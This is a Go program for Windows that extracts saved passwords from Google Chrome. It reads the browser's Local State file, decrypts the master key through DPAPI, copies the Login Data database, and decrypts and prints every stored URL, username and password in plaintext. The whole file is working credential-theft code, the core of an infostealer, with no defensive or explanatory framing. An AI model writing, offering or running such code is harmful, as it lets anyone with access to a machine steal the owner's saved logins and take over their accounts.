package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

var crypt32DLL = syscall.NewLazyDLL("crypt32.dll")
var kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
var cryptUnprotectDataProc = crypt32DLL.NewProc("CryptUnprotectData")
var localFreeProc = kernel32DLL.NewProc("LocalFree")

// DPAPI

type DataBlob struct {
	Size uint32
	Data *byte
}

func NewBlob(data []byte) *DataBlob {
	if len(data) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{Data: &data[0], Size: uint32(len(data))}
}

func (blob *DataBlob) Bytes() []byte {
	data := make([]byte, blob.Size)
	copy(data, unsafe.Slice(blob.Data, blob.Size))
	return data
}

func dpapiDecrypt(data []byte) ([]byte, error) {
	var dataBlob DataBlob
	r, _, err := cryptUnprotectDataProc.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&dataBlob)))
	if r == 0 {
		return nil, err
	}
	defer localFreeProc.Call(uintptr(unsafe.Pointer(dataBlob.Data)))
	return dataBlob.Bytes(), nil
}

// Utils

func copyFile(src, dst string) error {
	file, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	err = os.WriteFile(dst, file, 0644)
	if err != nil {
		return err
	}
	return nil
}

func getUserDataPath() (string, error) {
	homePath, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homePath, "AppData", "Local", "Google", "Chrome", "User Data"), nil
}

func getLocalStatePath() (string, error) {
	userDataPath, err := getUserDataPath()
	if err != nil {
		return "", err
	}
	return filepath.Join(userDataPath, "Local State"), nil
}

func getLoginDataPath() (string, error) {
	userDataPath, err := getUserDataPath()
	if err != nil {
		return "", err
	}
	return filepath.Join(userDataPath, "Default", "Login Data"), nil
}

// Start

func getMasterKey() ([]byte, error) {
	localStatePath, err := getLocalStatePath()
	if err != nil {
		return nil, err
	}
	jsonFile, err := os.Open(localStatePath)
	if err != nil {
		return nil, err
	}
	defer jsonFile.Close()
	jsonBytes, err := io.ReadAll(jsonFile)
	if err != nil {
		return nil, err
	}
	var result map[string]map[string]string
	json.Unmarshal(jsonBytes, &result)
	base64CryptedMasterKey := result["os_crypt"]["encrypted_key"]
	cryptedMasterKey := make([]byte, base64.StdEncoding.EncodedLen(len(base64CryptedMasterKey)))
	_, err = base64.StdEncoding.Decode(cryptedMasterKey, []byte(base64CryptedMasterKey))
	if err != nil {
		return nil, err
	}
	return dpapiDecrypt(cryptedMasterKey[5:])
}

func decryptPassword(masterKey, encryptedPassword []byte) (string, error) {
	cipherText := encryptedPassword[3:]
	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonceSize := aesgcm.NonceSize()
	nonce, cipherText := cipherText[:nonceSize], cipherText[nonceSize:]
	password, err := aesgcm.Open(nil, nonce, cipherText, nil)
	if err != nil {
		return "", err
	}
	return string(password), nil
}

func main() {
	masterKey, err := getMasterKey()
	if err != nil {
		panic(err)
	}

	dbFile, err := getLoginDataPath()
	if err != nil {
		panic(err)
	}

	copyFile(dbFile, "db.sqlite")

	db, err := sql.Open("sqlite3", "db.sqlite")
	if err != nil {
		panic(err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
	if err != nil {
		panic(err)
	}
	defer rows.Close()

	for rows.Next() {
		var url, username string
		var encryptedPassword []byte
		err := rows.Scan(&url, &username, &encryptedPassword)
		if err != nil {
			panic(err)
		}
		password, err := decryptPassword(masterKey, encryptedPassword)
		if err != nil {
			panic(err)
		}
		fmt.Println(url, username, password)
	}
}